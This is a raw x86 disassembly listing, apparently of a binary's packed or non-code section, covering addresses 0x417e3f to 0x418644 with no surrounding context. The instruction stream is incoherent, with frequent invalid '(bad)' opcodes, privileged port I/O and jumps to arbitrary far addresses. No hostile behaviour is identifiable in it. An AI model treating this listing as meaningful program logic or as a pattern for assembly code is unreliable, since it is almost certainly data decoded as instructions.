  417e3f:	sub    BYTE PTR [ebp+0x22],dh
  417e42:	adc    al,0xa1
  417e44:	ins    DWORD PTR es:[edi],dx
  417e45:	pop    ds
  417e46:	mov    BYTE PTR [eax+0x6],al
  417e49:	outs   dx,BYTE PTR ds:[esi]
  417e4a:	jne    0x417e61
  417e4c:	outs   dx,BYTE PTR ds:[esi]
  417e4d:	dec    ebx
  417e4e:	xchg   ebp,eax
  417e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e50:	clc    
  417e51:	and    edx,DWORD PTR [ebx]
  417e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e54:	mov    dh,0x79
  417e56:	das    
  417e57:	or     ebp,DWORD PTR [edx-0x39]
  417e5a:	pop    ecx
  417e5b:	loop   0x417e67
  417e5d:	or     eax,0xd1e7eeca
  417e62:	in     eax,dx
  417e63:	xor    al,0x3e
  417e65:	xchg   DWORD PTR [edi],eax
  417e67:	adc    al,0x4d
  417e69:	or     DWORD PTR [ecx-0x52],esi
  417e6c:	cwde   
  417e6d:	xchg   esp,eax
  417e6e:	out    0xb,eax
  417e70:	lahf   
  417e71:	xchg   ecx,eax
  417e72:	jns    0x417eec
  417e74:	sub    eax,0x16942082
  417e79:	lock loop 0x417ed9
  417e7c:	in     eax,0xdd
  417e7e:	ror    BYTE PTR [ebx-0x13],cl
  417e81:	ds popf 
  417e83:	dec    edx
  417e84:	xchg   ebx,eax
  417e85:	in     eax,dx
  417e86:	jp     0x417e12
  417e88:	inc    ebx
  417e89:	cmp    eax,0x7a5e5c3d
  417e8e:	out    0x8e,al
  417e90:	add    eax,0x9ec8960e
  417e95:	frstor [ecx]
  417e97:	mov    DWORD PTR [esi],edx
  417e99:	jae    0x417ef5
  417e9b:	out    0x25,eax
  417e9d:	mov    al,ds:0xc83ce590
  417ea2:	push   esi
  417ea3:	mov    cl,0xd7
  417ea5:	sub    al,0x2c
  417ea7:	ja     0x417e44
  417ea9:	xor    dh,BYTE PTR [ebx+0xbc31cec]
  417eaf:	add    ah,BYTE PTR [esi-0xafbd29e]
  417eb5:	or     edx,DWORD PTR [ecx-0x5dfa74b]
  417ebb:	or     DWORD PTR [eax],ebx
  417ebd:	int    0xed
  417ebf:	ret    0xa23a
  417ec2:	mov    BYTE PTR [edi+0x123b5835],0xfb
  417ec9:	pushf  
  417eca:	mov    ch,0x32
  417ecc:	or     BYTE PTR [ebx-0x56],dh
  417ecf:	stos   DWORD PTR es:[edi],eax
  417ed0:	cmp    BYTE PTR [esi],bh
  417ed2:	iret   
  417ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ed4:	or     DWORD PTR [ebp+0x373db14d],ecx
  417eda:	cli    
  417edb:	pop    edi
  417edc:	xor    esi,DWORD PTR ds:0x16e20ccf
  417ee2:	pop    DWORD PTR [edx+ebx*8-0x56139d26]
  417ee9:	pushf  
  417eea:	pop    es
  417eeb:	cwde   
  417eec:	test   eax,0x3ce7d82b
  417ef1:	mov    dl,0xa
  417ef3:	dec    ebx
  417ef4:	inc    esp
  417ef5:	pusha  
  417ef6:	inc    esp
  417ef7:	in     eax,0x18
  417ef9:	inc    edx
  417efa:	cwde   
  417efb:	xor    DWORD PTR [eax],ebp
  417efd:	je     0x417e85
  417eff:	out    dx,eax
  417f00:	loop   0x417f30
  417f02:	push   ss
  417f03:	ins    DWORD PTR es:[edi],dx
  417f04:	xchg   ebp,eax
  417f05:	jl     0x417efa
  417f07:	inc    ebp
  417f08:	or     al,0x87
  417f0a:	jo     0x417e8f
  417f0c:	scas   al,BYTE PTR es:[edi]
  417f0d:	rol    BYTE PTR [edi+0x48],0xc7
  417f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f12:	stos   BYTE PTR es:[edi],al
  417f13:	lods   al,BYTE PTR gs:[esi]
  417f15:	das    
  417f16:	and    al,0xbc
  417f18:	popa   
  417f19:	or     eax,0x438ff203
  417f1e:	psrld  mm0,QWORD PTR [esi-0x1f8d22b1]
  417f25:	scas   eax,DWORD PTR es:[edi]
  417f26:	inc    ebx
  417f27:	gs clc 
  417f29:	imul   edi,DWORD PTR [ebp+0x1df2b5f4],0x75b4e249
  417f33:	pop    esp
  417f34:	retf   0x3abc
  417f37:	dec    eax
  417f38:	mov    ds:0xc9be4f04,al
  417f3d:	(bad)  
  417f3e:	xor    eax,0xede2a588
  417f43:	leave  
  417f44:	pop    es
  417f45:	imul   eax,DWORD PTR [ecx+0x47],0xffffffcd
  417f49:	or     DWORD PTR [edx],edx
  417f4b:	ret    
  417f4c:	ds in  eax,0x2
  417f4f:	mov    cl,0x96
  417f51:	and    BYTE PTR [eax],0xd7
  417f54:	lea    esi,[ecx]
  417f56:	int3   
  417f57:	cmc    
  417f58:	mov    ecx,DWORD PTR [ebp-0x3]
  417f5b:	sub    DWORD PTR [bp+di+0xa89],ebp
  417f60:	adc    ch,BYTE PTR [eax]
  417f62:	sub    dh,dl
  417f64:	add    al,0x75
  417f66:	ins    DWORD PTR es:[edi],dx
  417f67:	add    BYTE PTR [eax+ecx*8+0x588570a],al
  417f6e:	cwde   
  417f6f:	or     eax,0x9e61c78e
  417f74:	mov    ch,0x58
  417f76:	iret   
  417f77:	dec    esp
  417f78:	jl     0x417fc9
  417f7a:	fnstcw WORD PTR [edi]
  417f7c:	jp     0x417f73
  417f7e:	iret   
  417f7f:	outs   dx,DWORD PTR ds:[esi]
  417f80:	loop   0x417f66
  417f82:	or     al,0x56
  417f84:	push   eax
  417f85:	jmp    0x417f5f
  417f87:	push   ss
  417f88:	int    0x66
  417f8a:	jbe    0x417fee
  417f8c:	aas    
  417f8d:	push   ebx
  417f8e:	fnstsw WORD PTR [esi+edi*1-0x22]
  417f92:	lods   eax,DWORD PTR ds:[esi]
  417f93:	jle    0x417faa
  417f95:	cmc    
  417f96:	cmp    ebx,ecx
  417f98:	scas   al,BYTE PTR es:[edi]
  417f99:	mov    esp,0x7588e4be
  417f9e:	mov    fs,esp
  417fa0:	sub    BYTE PTR [ebx-0x6c],cl
  417fa3:	sub    BYTE PTR [esi+0x2f],dl
  417fa6:	dec    ecx
  417fa7:	or     eax,0xe3f73cc7
  417fac:	int3   
  417fad:	out    dx,eax
  417fae:	xor    ch,BYTE PTR [esi]
  417fb0:	push   eax
  417fb1:	int3   
  417fb2:	bndldx (bad),[ebx+eax*1]
  417fb6:	and    cl,BYTE PTR [edx+0x23]
  417fb9:	int3   
  417fba:	fidiv  WORD PTR [ebp-0x7c]
  417fbd:	push   cs
  417fbe:	pop    edi
  417fbf:	imul   al
  417fc1:	push   edi
  417fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fc3:	push   ebx
  417fc4:	jle    0x418045
  417fc6:	fild   DWORD PTR ds:0x26acd657
  417fcc:	retf   0xf134
  417fcf:	outs   dx,BYTE PTR ds:[esi]
  417fd0:	cmp    eax,DWORD PTR [esi-0x7b]
  417fd3:	(bad)  
  417fd5:	mov    esi,DWORD PTR [esi]
  417fd7:	iret   
  417fd8:	loopne 0x417f61
  417fda:	out    dx,eax
  417fdb:	stc    
  417fdc:	stc    
  417fdd:	ret    0xd627
  417fe0:	addr16 and eax,0x681cf072
  417fe6:	shl    DWORD PTR [edx+0x6b],0x17
  417fea:	paddd  mm7,mm5
  417fed:	mov    cl,0x5a
  417fef:	mov    bh,0x42
  417ff1:	rol    DWORD PTR [ecx+0x603507db],cl
  417ff7:	(bad)  
  417ff8:	sub    eax,0xb19c08dd
  417ffd:	xlat   BYTE PTR cs:[ebx]
  417fff:	and    DWORD PTR [ebp-0x776db5ed],esi
  418005:	dec    edx
  418006:	call   0x4010:0x289c19b9
  41800d:	repnz test eax,0x3b76deb4
  418013:	push   esi
  418014:	outs   dx,BYTE PTR ds:[esi]
  418015:	mov    DWORD PTR [esp-0x1d],esi
  418019:	sti    
  41801a:	or     BYTE PTR [esi-0x2e36ee11],dh
  418020:	push   ss
  418021:	mov    cl,0x97
  418023:	xchg   ecx,eax
  418024:	fld    DWORD PTR [eax]
  418026:	retf   0xe52c
  418029:	mov    ebx,0x606f3f53
  41802e:	adc    al,0x49
  418031:	stc    
  418032:	js     0x417fee
  418034:	xchg   ecx,ecx
  418036:	fsubr  QWORD PTR [edx-0x78ffa741]
  41803c:	xchg   esi,eax
  41803d:	stc    
  41803e:	cdq    
  41803f:	aas    
  418040:	or     eax,0x10776871
  418045:	cwde   
  418046:	ss mov bh,0xc1
  418049:	daa    
  41804a:	mov    ebp,0x2c3234a8
  41804f:	repz inc eax
  418051:	lea    edx,[ebp+0xf8e4d28]
  418057:	jne    0x418080
  418059:	pop    edx
  41805a:	or     BYTE PTR [edx-0x1c],cl
  41805d:	jne    0x418006
  41805f:	mov    dh,0xbf
  418061:	lds    esi,FWORD PTR [edi+edx*8]
  418064:	mov    WORD PTR [edx],fs
  418066:	sub    dl,BYTE PTR [ebp-0x20e7b5c3]
  41806c:	out    0xad,al
  41806e:	xor    ecx,ebp
  418070:	je     0x418073
  418072:	mov    gs,eax
  418074:	jg     0x418051
  418076:	jnp    0x41800f
  418078:	mov    eax,ds:0xe44096ec
  41807d:	inc    eax
  41807e:	xor    ah,BYTE PTR [eax]
  418080:	jns    0x418079
  418082:	cmp    eax,0x2f839afd
  418087:	xor    al,0xc6
  418089:	mov    edi,0x41a5b852
  41808e:	cwde   
  41808f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418090:	pop    esi
  418091:	cwde   
  418092:	sbb    edi,ecx
  418094:	xchg   edx,eax
  418095:	push   esi
  418096:	cmp    dh,ch
  418098:	dec    esi
  418099:	mov    edi,0x66eb0bbb
  41809e:	sbb    BYTE PTR [eax],ah
  4180a0:	xor    bl,al
  4180a2:	shl    DWORD PTR [edx-0x6b2f681d],cl
  4180a8:	and    cl,BYTE PTR [edi-0x5e7de6eb]
  4180ae:	aad    0x3b
  4180b0:	jne    0x4180dd
  4180b2:	mov    WORD PTR [esi],ds
  4180b4:	cmp    bh,dh
  4180b6:	sub    eax,0x8e3e985
  4180bb:	inc    ebx
  4180bc:	push   0x53c59e94
  4180c1:	call   0x82e27ff3
  4180c6:	je     0x4180b0
  4180c8:	lahf   
  4180c9:	jno    0x418079
  4180cb:	aas    
  4180cc:	cmp    ax,0x196a
  4180d0:	xor    DWORD PTR [edx-0xd62cfa2],edx
  4180d6:	inc    ebx
  4180d7:	retf   0xccfc
  4180da:	outs   dx,BYTE PTR ds:[esi]
  4180db:	test   BYTE PTR [ebp+0x40927d0a],dh
  4180e1:	dec    edx
  4180e2:	inc    edx
  4180e3:	test   BYTE PTR [ebp+0x73],al
  4180e6:	jle    0x418080
  4180e8:	mov    WORD PTR [ecx],ds
  4180ea:	mov    edi,0xf56f523c
  4180ef:	xchg   edx,ecx
  4180f1:	enter  0xd930,0x63
  4180f5:	push   ebx
  4180f6:	mov    WORD PTR [esi],fs
  4180f8:	shl    dh,cl
  4180fa:	or     ah,dh
  4180fc:	outs   dx,DWORD PTR ds:[esi]
  4180fd:	loope  0x41813e
  4180ff:	sub    DWORD PTR [ebp-0x1f],ebp
  418102:	mov    dh,BYTE PTR [esi+0x13]
  418105:	fistp  DWORD PTR gs:[ecx+0x52f5a45]
  41810c:	push   es
  41810d:	add    DWORD PTR [edi+0x4],ebp
  418110:	je     0x4180b8
  418112:	mov    ds:0xe2bed12b,al
  418117:	adc    eax,0x7728dacf
  41811c:	repnz fdivr DWORD PTR [esi-0x1]
  418120:	adc    DWORD PTR [ecx],eax
  418122:	jne    0x41817b
  418124:	lahf   
  418125:	fiadd  DWORD PTR [ebp-0x2f036cd1]
  41812b:	dec    esp
  41812c:	fist   DWORD PTR [ebx+0x5d15df66]
  418132:	in     al,0xcb
  418134:	xor    eax,0xe50f1e5b
  418139:	lds    ebp,FWORD PTR [ecx]
  41813b:	nop
  41813c:	outs   dx,WORD PTR ds:[esi]
  41813e:	or     BYTE PTR ds:0x7fdc8427,dh
  418144:	add    al,0x14
  418146:	adc    DWORD PTR [ecx],esp
  418148:	jmp    0xd220c618
  41814d:	out    0xf0,al
  41814f:	cs push ecx
  418151:	outs   dx,BYTE PTR ds:[esi]
  418152:	jb     0x418114
  418154:	repz jmp 0x97d61e90
  41815a:	mov    bl,0x65
  41815c:	jb     0x418169
  41815e:	sub    edi,ebp
  418160:	sbb    BYTE PTR [esi+esi*2+0x1790ce2],ch
  418167:	mov    al,ds:0xefe012cc
  41816c:	add    bl,bl
  41816e:	(bad)  [ebp+0x29]
  418171:	out    0x2d,al
  418173:	call   0xc6c8:0x298003d5
  41817a:	leave  
  41817b:	xor    eax,eax
  41817d:	call   0x5e67bbfd
  418182:	pushf  
  418183:	dec    ebx
  418184:	nop
  418185:	sub    DWORD PTR [esi],0xffffffa7
  418188:	cmp    al,0x83
  41818a:	push   0x68
  41818c:	lds    ecx,FWORD PTR [eax+edx*4-0x32]
  418190:	test   eax,0xbad22e62
  418195:	adc    esp,DWORD PTR [esi+0x48]
  418198:	div    dl
  41819a:	mov    WORD PTR [ecx-0x69],fs
  41819d:	pop    ebp
  41819e:	(bad)  
  41819f:	dec    edx
  4181a0:	pop    edx
  4181a1:	xor    bh,BYTE PTR [edi-0x2a]
  4181a4:	push   cs
  4181a5:	scas   eax,DWORD PTR es:[edi]
  4181a6:	leave  
  4181a7:	sbb    eax,0xef5534d0
  4181ac:	add    BYTE PTR [esi+0x30abea75],ah
  4181b2:	mov    dh,0xc0
  4181b4:	imul   eax,DWORD PTR [eax],0xb
  4181b7:	rol    DWORD PTR [ebx-0x7471f773],0x76
  4181be:	adc    al,0xa
  4181c0:	push   cs
  4181c1:	and    eax,0x990a115b
  4181c6:	jg     0x41817e
  4181c8:	rcr    DWORD PTR [ebx],1
  4181ca:	or     ebx,DWORD PTR [ecx+0x73]
  4181cd:	repnz mov ah,0x5a
  4181d0:	push   esp
  4181d1:	lods   al,BYTE PTR ds:[esi]
  4181d2:	or     BYTE PTR [edi-0x182e9303],ah
  4181d8:	cdq    
  4181d9:	mov    al,0x46
  4181db:	fwait
  4181dc:	and    al,0x96
  4181de:	add    al,0x56
  4181e0:	mov    dl,0xce
  4181e2:	imul   eax,DWORD PTR [ebp+0x28dcd913],0x982994ab
  4181ec:	and    BYTE PTR [edi+eiz*1-0x6e7326e],0x9a
  4181f4:	cld    
  4181f5:	xor    BYTE PTR [eax-0x6377a73f],dl
  4181fb:	ret    0x66be
  4181fe:	test   DWORD PTR ds:0x3f3ec35,esi
  418204:	fadd   QWORD PTR [edi+0x56]
  418207:	ins    BYTE PTR es:[edi],dx
  418208:	stos   BYTE PTR es:[edi],al
  418209:	push   ds
  41820a:	mov    dl,0x84
  41820c:	ins    DWORD PTR es:[edi],dx
  41820d:	inc    ecx
  41820e:	push   eax
  41820f:	xchg   edi,eax
  418210:	pop    es
  418211:	cld    
  418212:	imul   eax,DWORD PTR [edx+0x5c34d551],0x30adc138
  41821c:	pop    es
  41821d:	stos   BYTE PTR es:[edi],al
  41821e:	xor    al,0x23
  418220:	cmc    
  418221:	out    dx,eax
  418222:	adc    eax,0x6af61ca9
  418227:	fwait
  418228:	xor    esp,DWORD PTR [ebx]
  41822a:	xor    BYTE PTR [esi+0x2f],ch
  41822d:	sbb    BYTE PTR [edx],cl
  41822f:	xchg   cl,ch
  418231:	je     0x4181e1
  418233:	inc    esi
  418234:	adc    DWORD PTR [edx-0x3e],esi
  418237:	adc    DWORD PTR ds:0x2084eb5f,ebx
  41823d:	aas    
  41823e:	inc    ecx
  41823f:	aas    
  418240:	pop    eax
  418241:	(bad)  
  418242:	rcl    BYTE PTR [edi-0x53],0x55
  418246:	je     0x41829e
  418248:	jmp    0x74315cd7
  41824d:	pop    edi
  41824e:	es sub al,0x52
  418251:	not    bl
  418253:	mov    ecx,0xf4208004
  418258:	daa    
  418259:	in     eax,0x1a
  41825b:	adc    BYTE PTR [ecx-0x4fdccb33],ah
  418261:	int    0x96
  418263:	and    eax,0x511bbecb
  418268:	jb     0x4181ed
  41826a:	loop   0x4181f1
  41826c:	sbb    BYTE PTR [ecx-0x3c],0x73
  418270:	mov    esp,DWORD PTR [ebp-0xf]
  418273:	repnz out dx,al
  418275:	adc    BYTE PTR [ebp-0x9],al
  418278:	jp     0x41822b
  41827a:	xor    BYTE PTR [ebp+edi*8-0x7611ceb3],0x28
  418282:	fdiv   DWORD PTR [edi]
  418284:	pop    es
  418285:	stc    
  418286:	sbb    bh,ah
  418288:	in     eax,0x8b
  41828a:	add    al,0x24
  41828c:	ror    DWORD PTR [ecx],1
  41828e:	fcmovne st,st(2)
  418290:	mov    ah,0x82
  418292:	(bad)
  418295:	sub    edi,0x26b3f383
  41829b:	popa   
  41829c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41829d:	pusha  
  41829e:	cmp    edx,DWORD PTR [ebx+edi*8+0x186a8c2a]
  4182a5:	imul   eax,DWORD PTR [ebp-0xfdceb83],0xffffffb7
  4182ac:	sbb    al,BYTE PTR [ebp-0x1]
  4182af:	or     BYTE PTR [edx+0x36],dh
  4182b2:	fst    QWORD PTR [esp+ebp*2+0x6a]
  4182b6:	xchg   esp,eax
  4182b7:	test   al,0x17
  4182b9:	test   BYTE PTR [edx],0x34
  4182bc:	add    BYTE PTR [edi-0x8],ah
  4182bf:	stos   BYTE PTR es:[edi],al
  4182c0:	mov    ebp,0x556c954a
  4182c5:	push   es
  4182c6:	mov    fs,edi
  4182c8:	push   ss
  4182c9:	pop    DWORD PTR [esi]
  4182cb:	mov    BYTE PTR ds:0xdbf2cba0,0x89
  4182d2:	dec    ebx
  4182d3:	je     0x4182c7
  4182d5:	adc    BYTE PTR [esi-0x4e13f15f],al
  4182db:	xchg   edx,eax
  4182dc:	add    esi,DWORD PTR [edx]
  4182de:	xor    DWORD PTR [ebp+0x7],edi
  4182e1:	xchg   ebp,eax
  4182e2:	xor    DWORD PTR [ebp+0x1d72e769],eax
  4182e8:	mov    ecx,0xf7617f1b
  4182ed:	jns    0x4182a0
  4182ef:	adc    eax,0x483d4e74
  4182f4:	xlat   BYTE PTR ds:[ebx]
  4182f5:	int    0x25
  4182f7:	xor    al,0xef
  4182f9:	jg     0x418314
  4182fb:	dec    esi
  4182fc:	or     dl,ah
  4182fe:	pop    esi
  4182ff:	or     eax,0x53a021f8
  418304:	cmc    
  418305:	loopne 0x4182ce
  418307:	jmp    0x3f3ec67b
  41830c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41830d:	out    0x1,al
  41830f:	fidivr DWORD PTR [esi+0x73518862]
  418315:	mov    ebx,0x2dae66b
  41831a:	jmp    0xb655535b
  41831f:	sub    BYTE PTR [edx+ebx*1-0x62190f0a],cl
  418326:	or     edx,DWORD PTR [ecx-0x32]
  418329:	sub    esi,DWORD PTR [eax+eax*4]
  41832c:	aam    0x6b
  41832e:	push   esp
  41832f:	outs   dx,DWORD PTR ds:[esi]
  418330:	dec    esi
  418331:	sar    BYTE PTR [eax],1
  418333:	loopne 0x418359
  418335:	mov    esi,0xfebe3116
  41833a:	mov    ch,0x16
  41833c:	and    eax,0x44cf43db
  418341:	je     0x41838e
  418343:	mov    dh,0x12
  418345:	arpl   bp,bx
  418347:	inc    edi
  418348:	push   ds
  418349:	push   0xf7bcb248
  41834e:	mov    al,0x33
  418350:	out    dx,al
  418351:	mov    edi,0x15c8041e
  418356:	adc    eax,DWORD PTR [ecx]
  418358:	(bad)  
  418359:	sbb    edi,DWORD PTR [edi+eax*8-0x790b5a82]
  418360:	cmp    eax,0x3e8c6c61
  418365:	cmp    eax,0x73d875bf
  41836a:	ret    0x9801
  41836d:	inc    esp
  41836e:	sar    DWORD PTR [esi+0x17e4b24],0xec
  418375:	scas   al,BYTE PTR es:[edi]
  418376:	adc    eax,0x12a053ec
  41837b:	(bad)  
  41837c:	fmul   st(7),st
  41837e:	and    ch,BYTE PTR [ecx]
  418380:	scas   eax,DWORD PTR es:[edi]
  418381:	adc    al,0x29
  418383:	push   ecx
  418384:	mov    ebx,0x3215b886
  418389:	mov    al,0xce
  41838b:	jno    0x4183d2
  41838d:	pop    ebx
  41838e:	(bad)  
  418390:	out    0xb2,eax
  418392:	or     ebp,ebp
  418394:	lock push esp
  418396:	stc    
  418397:	xchg   ebp,eax
  418398:	in     al,0xb1
  41839a:	sub    eax,DWORD PTR [ebp-0x23]
  41839d:	push   esp
  41839e:	push   edi
  41839f:	in     eax,dx
  4183a0:	imul   DWORD PTR [eax+0x21]
  4183a3:	cmp    DWORD PTR [ecx-0x38],ecx
  4183a6:	sbb    DWORD PTR [edi],esi
  4183a8:	jae    0x418414
  4183aa:	add    al,0x78
  4183ac:	push   ebp
  4183ad:	div    dl
  4183af:	fadd   DWORD PTR [edi]
  4183b1:	jle    0x4183cf
  4183b3:	xor    eax,0x355ea315
  4183b8:	pop    ebx
  4183b9:	test   al,0x65
  4183bb:	push   es
  4183bc:	ret    0x5aeb
  4183bf:	adc    eax,0x22749d8c
  4183c4:	push   ds
  4183c5:	push   eax
  4183c6:	dec    esi
  4183c7:	jg     0x4183ad
  4183c9:	lds    edi,FWORD PTR [ecx-0x6f24fb1c]
  4183cf:	loope  0x418372
  4183d1:	lea    ecx,[edx+0x5af8b470]
  4183d7:	pop    edi
  4183d8:	das    
  4183d9:	out    dx,al
  4183da:	ins    DWORD PTR es:[edi],dx
  4183db:	or     al,0x26
  4183dd:	enter  0x71bd,0xa8
  4183e1:	test   cl,al
  4183e3:	pop    ss
  4183e4:	frstor [esp+ebp*1-0x19f77719]
  4183eb:	xlat   BYTE PTR ds:[ebx]
  4183ec:	cmp    bl,BYTE PTR [ebp+0x28]
  4183ef:	in     al,dx
  4183f0:	push   ds
  4183f1:	jle    0x41842c
  4183f3:	or     dl,BYTE PTR ds:0x25d5ec57
  4183f9:	mov    ebx,0xd45599e5
  4183fe:	call   0x6685:0xf7b6f9da
  418405:	(bad)  
  418407:	adc    bl,BYTE PTR [edi-0x10eb644a]
  41840d:	lods   al,BYTE PTR ds:[esi]
  41840e:	mov    esi,0xd3330c47
  418413:	mov    esi,0x71335bdd
  418418:	mov    al,0x14
  41841a:	sbb    al,0x6
  41841c:	test   al,0xe5
  41841e:	mov    WORD PTR [eax+0x6be583a8],gs
  418424:	mov    DWORD PTR [edx-0x14ce1340],ecx
  41842a:	pop    ds
  41842b:	xchg   ebx,eax
  41842c:	xlat   BYTE PTR ds:[ebx]
  41842d:	mov    DWORD PTR [eax-0x3b4a3130],0x8fd161f6
  418437:	out    dx,al
  418438:	jnp    0x41844f
  41843a:	sbb    eax,0x79073ee4
  41843f:	dec    edi
  418440:	in     al,0xdf
  418442:	sar    DWORD PTR [ebx+eiz*4-0x64],1
  418446:	mov    esp,0x99128576
  41844b:	shr    BYTE PTR [ebp+0x63],cl
  41844e:	stos   DWORD PTR es:[edi],eax
  41844f:	int    0xf1
  418451:	mov    ah,0xfc
  418453:	out    0x8b,al
  418455:	ds (bad) 
  418458:	jns    0x4184a4
  41845a:	out    dx,eax
  41845b:	mov    ecx,DWORD PTR [esi+0x5cd646ae]
  418461:	retf   0xecfa
  418464:	(bad)  
  418466:	mov    al,ds:0xabad0699
  41846b:	(bad)  
  41846e:	or     BYTE PTR [eax-0x73],ah
  418471:	stos   DWORD PTR es:[edi],eax
  418472:	adc    esi,DWORD PTR [ebx]
  418474:	xlat   BYTE PTR ds:[ebx]
  418475:	bound  ebx,QWORD PTR ds:0x3a7a42c4
  41847b:	adc    dh,BYTE PTR [edi-0x17bd642d]
  418481:	sub    eax,0xb7cb03d6
  418486:	xlat   BYTE PTR ds:[ebx]
  418487:	leave  
  418488:	icebp  
  418489:	sbb    eax,0xbbe0811a
  41848e:	sahf   
  41848f:	mov    ebp,0xdfb1cb41
  418494:	mov    bh,0x92
  418496:	nop
  418497:	test   BYTE PTR [ecx],dh
  418499:	ror    DWORD PTR [ebp-0x2d],0x41
  41849d:	mov    ebx,0x214a5efa
  4184a2:	cmp    BYTE PTR [esi+0x674beb01],ah
  4184a8:	ror    ebx,1
  4184aa:	or     BYTE PTR [esi+0x45f7c0e7],ah
  4184b0:	xor    eax,0x8cfbba19
  4184b5:	std    
  4184b6:	jb     0x41846a
  4184b8:	pop    esi
  4184b9:	(bad)  
  4184ba:	out    0xce,eax
  4184bc:	mov    esp,ebx
  4184be:	sahf   
  4184bf:	cmp    al,0xfd
  4184c1:	jmp    0xf15cef01
  4184c6:	int3   
  4184c7:	cmp    BYTE PTR [ecx],cl
  4184c9:	stc    
  4184ca:	mov    ebx,DWORD PTR [esi-0x65e73ac7]
  4184d0:	dec    esi
  4184d1:	jg     0x418462
  4184d3:	in     al,0x0
  4184d5:	dec    ecx
  4184d6:	mov    bh,0xc8
  4184d8:	out    dx,al
  4184d9:	sti    
  4184da:	ror    al,cl
  4184dc:	nop
  4184dd:	xchg   ebx,eax
  4184de:	mov    eax,0xe4f91c35
  4184e3:	ret    0x256a
  4184e6:	(bad)  [esi+ecx*8-0x3e]
  4184ea:	in     eax,dx
  4184eb:	sub    BYTE PTR [eax+0x69],dl
  4184ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184ef:	sbb    BYTE PTR [edi+eiz*1],0x2a
  4184f3:	lea    ecx,[eax+edx*1-0x6e7e70e1]
  4184fa:	pop    ss
  4184fb:	cmp    al,0xff
  4184fd:	push   ebx
  4184ff:	and    dl,BYTE PTR [esi]
  418501:	dec    ebx
  418502:	mov    ebp,0x458d4fae
  418507:	sbb    dh,BYTE PTR [ebp-0x27769b18]
  41850d:	xor    esp,0x9c74ec6
  418513:	mov    ebx,0x8f8c42c7
  418518:	imul   esi,ebx,0x9a84faf1
  41851e:	stos   BYTE PTR es:[edi],al
  41851f:	in     eax,dx
  418520:	mov    dh,0x64
  418522:	ss mov ebx,0x55aa26aa
  418528:	jmp    0x2bd54453
  41852d:	call   0xb6b80aa9
  418532:	cmc    
  418533:	cmp    dh,dl
  418535:	xor    eax,0xc98ef388
  41853a:	mov    dh,0x3d
  41853c:	(bad)  
  41853d:	jp     0x418506
  41853f:	(bad)  
  418540:	lock mov eax,0x33c60650
  418546:	stos   DWORD PTR es:[edi],eax
  418547:	ret    
  418548:	ds enter 0x58e8,0x26
  41854d:	clc    
  41854e:	loopne 0x4184d3
  418550:	neg    al
  418552:	dec    esp
  418553:	push   ds
  418554:	mov    ebp,0xfcefe9ab
  418559:	cmp    eax,0xfdf1991f
  41855e:	call   0xad8fc1b4
  418563:	inc    esi
  418564:	popa   
  418565:	push   ebp
  418566:	call   DWORD PTR [eax]
  418568:	xor    DWORD PTR [edi],edi
  41856a:	jb     0x41857a
  41856c:	out    dx,al
  41856d:	push   esi
  41856e:	cmp    DWORD PTR [ebx-0x39ad4b0a],edi
  418574:	clc    
  418575:	push   esi
  418576:	fneni(8087 only) 
  418578:	test   DWORD PTR [eax],eax
  41857a:	into   
  41857b:	pop    edi
  41857c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41857d:	xor    esi,0x47
  418580:	ret    
  418581:	outs   dx,BYTE PTR ds:[esi]
  418582:	xor    bl,BYTE PTR [esi+0x7]
  418585:	cmp    esi,DWORD PTR [ebx+0x26]
  418588:	rcl    BYTE PTR [edx-0x1b],0x94
  41858c:	dec    edi
  41858d:	jbe    0x41858f
  41858f:	sub    BYTE PTR [edx+edi*2],dl
  418592:	inc    eax
  418593:	push   es
  418594:	cmc    
  418595:	test   eax,0xc2e4510f
  41859a:	ins    BYTE PTR es:[edi],dx
  41859b:	jb     0x41854e
  41859d:	jl     0x418584
  41859f:	enter  0x6cee,0x42
  4185a3:	push   edi
  4185a4:	retf   
  4185a5:	jmp    0xa9f0:0xdd577e0f
  4185ac:	mov    bl,BYTE PTR [edi+0x6a3ea4e0]
  4185b2:	mov    ebx,0x977e4357
  4185b7:	test   BYTE PTR ds:0x91bd12ee,dh
  4185bd:	xor    DWORD PTR [esi],edi
  4185bf:	mov    DWORD PTR [ebp-0x5fcf8d3e],ebp
  4185c5:	pushf  
  4185c6:	aaa    
  4185c7:	push   ss
  4185c8:	fcmovnbe st,st(1)
  4185ca:	mov    DWORD PTR [ecx+eiz*8],esp
  4185cd:	inc    ebp
  4185ce:	mov    bl,0x67
  4185d0:	fdiv   st,st(2)
  4185d2:	or     ch,BYTE PTR [edi]
  4185d4:	lea    esi,[eax-0x5]
  4185d7:	adc    eax,0xf27fe2d8
  4185dc:	mov    ch,0x11
  4185de:	loop   0x41865a
  4185e0:	les    ebx,FWORD PTR [edi-0x24]
  4185e3:	out    0x41,al
  4185e5:	loope  0x418633
  4185e7:	in     al,0x79
  4185e9:	jmp    0x5202:0x86b812d2
  4185f0:	(bad)
  4185f3:	cmp    BYTE PTR ds:0x905c1c21,ch
  4185f9:	lahf   
  4185fa:	das    
  4185fb:	or     BYTE PTR [ebp+0x57],ch
  4185fe:	mov    ds:0x22698771,eax
  418603:	mov    ah,0x60
  418605:	jmp    0x64a9bb0f
  41860a:	xor    edx,DWORD PTR [eax-0x777d311]
  418610:	mov    ebp,0x3eefe14a
  418615:	and    ah,BYTE PTR [esi-0x3b]
  418618:	cld    
  418619:	push   ebx
  41861a:	aam    0x97
  41861c:	es inc eax
  41861e:	adc    cl,BYTE PTR [esi]
  418620:	sti    
  418621:	test   al,0x55
  418623:	sub    DWORD PTR [esi+0x1852644b],ebp
  418629:	rcr    BYTE PTR [edx+eiz*8-0x6ab12721],0xbf
  418631:	je     0x4185cd
  418633:	push   ebx
  418634:	mov    ebx,0x73370ec4
  418639:	retf   0xe55f
  41863c:	out    dx,al
  41863d:	sbb    ecx,DWORD PTR [edx-0x5dabfb29]
  418643:	in     al,dx
  418644:	push   0x49de4883
